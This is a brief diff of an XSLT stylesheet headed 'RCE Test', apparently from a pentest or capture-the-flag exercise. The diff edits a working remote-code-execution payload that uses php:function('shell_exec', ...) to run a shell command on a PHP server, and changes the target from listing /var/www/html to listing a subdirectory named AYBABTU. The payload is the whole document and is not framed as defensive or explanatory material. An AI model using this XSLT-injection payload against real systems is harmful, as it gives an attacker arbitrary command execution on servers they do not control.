@@ -8,7 +8,7 @@
       <body>
         <h2>RCE Test: ls -la /var/www/html</h2>
         <pre>
-          <xsl:value-of select="php:function('shell_exec', 'ls -la /var/www/html')" />
+          <xsl:value-of select="php:function('shell_exec', 'ls -la /var/www/html/AYBABTU')" />
         </pre>
       </body>
     </html>
